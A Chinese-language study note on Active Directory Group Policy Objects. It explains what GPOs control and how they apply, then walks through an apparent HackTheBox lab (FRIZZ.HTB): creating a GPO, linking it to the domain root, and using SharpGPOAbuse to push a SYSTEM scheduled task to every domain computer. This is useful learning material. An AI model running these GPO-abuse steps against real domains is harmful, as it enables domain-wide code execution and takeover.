# GPO

## 介绍

GPO是Group Policy Object(组策略对象)的缩写,是Active Directory(AD)里用来集中管理Windows计算机和用户行为的一套配置机制.

本质=域管理员用来"统一下发规则"的工具

GPO=给一群用户/计算机批量下发"系统规则"的配置包

## GPO能干什么?

### 1)安全策略

(1)密码复杂度,最少长度

(2)密码锁定策略

(3)禁用/允许NTLM/SMB签名

(4)防火墙规则

域安全的核心

### 2)系统行为控制

(1)禁用命令行/powershell

(2)禁用注册表编辑器

(3)禁用usb

(4)登录/注销脚本

### 4)软件&环境配置

(1)自动安装软件(MSI)

(2)映射网络驱动器

(3)设置代理,桌面,壁纸

(4)下发计划人物

### 5)高危:可执行内容

(1)启动脚本/登录脚本

(2)计划任务

(3)注册表Run项

(4)软件安装脚本

## GPO是怎么生效的?

GPO不会直接绑用户,而是通过OU(组织单位)

```
域
 └── OU（部门/服务器）
      ├── 用户
      └── 计算机
```

GPO链接到OU

OU里的用户/计算机都会吃到这个GPO

## GPO的生效顺序

L->S->D->OU

| 顺序 | 含义                                    |
| ---- | --------------------------------------- |
| L    | Local（本地策略）                       |
| S    | Site                                    |
| D    | Domain                                  |
| OU   | Organizational Unit（最细，优先级最高） |

## 常用命令

### 1)查询

```
# 查看 GPO
Get-GPO -All

# 查看 GPO 权限
Get-GPPermission -Name "xxx"

# BloodHound
Find-InterestingDomainGPO
```

### 2)下发任务(设置影响范围)

```
新建规则
New-GPO -Name "Test"
把规则链接上根
New-GPLink -Name "Test" -Target "DC=FRIZZ,DC=HTB"
➡ 把 GPO 链接到域根

等价于：

“让整个 FRIZZ.HTB 域里的计算机都吃到这个 GPO”

📌 影响范围：

所有域内计算机

包括：域控（DC）

⚠️ 这是最危险的一步

链接到域根 ≈ 全域投毒

在真实环境中 = 严重事故
```

### 3)往GPO塞计划任务



| 参数                              | 含义                       |
| --------------------------------- | -------------------------- |
| `--AddComputerTask`               | **计算机级别**（不是用户） |
| `--GPOName "test"`                | 写入哪个 GPO               |
| `--Command powershell.exe`        | 执行程序                   |
| `--Arguments "whoami > c:/1.txt"` | 执行内容                   |
| `--TaskName "shell"`              | 任务名                     |
| `--Author "test"`                 | 无关紧要                   |

```
c:/tmp/SharpGPOAbuse.exe `
  --AddComputerTask `
  --GPOName "test" `
  --Command "powershell.exe" `
  --Arguments "whoami > c:/1.txt" `
  --Author "test" `
  --TaskName "shell"
它在做什么？

➡ 往 GPO 里塞一个「计算机级别的计划任务」

本质效果等价于：

在所有应用该 GPO 的计算机上
创建一个 以 SYSTEM 身份运行的计划任务
```

#### 4)刷新GPO

```
gpupdate /force
作用

➡ 立即刷新 GPO

正常情况下：

计算机 GPO：90–120 分钟

DC：5 分钟

/force 的意思是：

不管有没有变化

立刻重新应用所有 GPO
```

